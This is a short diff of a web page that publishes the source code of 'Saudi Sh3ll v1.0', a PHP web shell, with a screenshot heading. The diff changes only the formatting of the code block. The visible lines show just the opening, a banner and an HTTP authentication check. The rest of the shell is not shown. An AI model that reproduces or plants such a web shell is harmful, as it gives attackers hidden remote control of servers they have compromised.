@@ -16,11 +16,11 @@ Saudi Sh3ll v1.0, by al-swisre
 
 ### Saudi Sh3ll v1.0 Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?
+{% highlight php %}<?
 ob_start();
-?&gt;
+?>
 
-&lt;?php
+<?php
 ############################################################\
 #                                        #
 #            Saudi Sh3ll v1.0            #
@@ -41,10 +41,10 @@ if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name 
    exit("&lt;b&gt;&lt;/b&gt;");
    }
 }
-?&gt;
+?>
 
 
-&lt;?
+<?
 
 
 
@@ -3878,8 +3878,8 @@ exit; }
 
 
 
-?&gt;
-</pre>
+?>
+{% endhighlight %}
 
 ### Screenshot of Saudi Sh3ll v1.0<figure id="attachment_399" style="width: 604px;" class="wp-caption aligncenter">
 
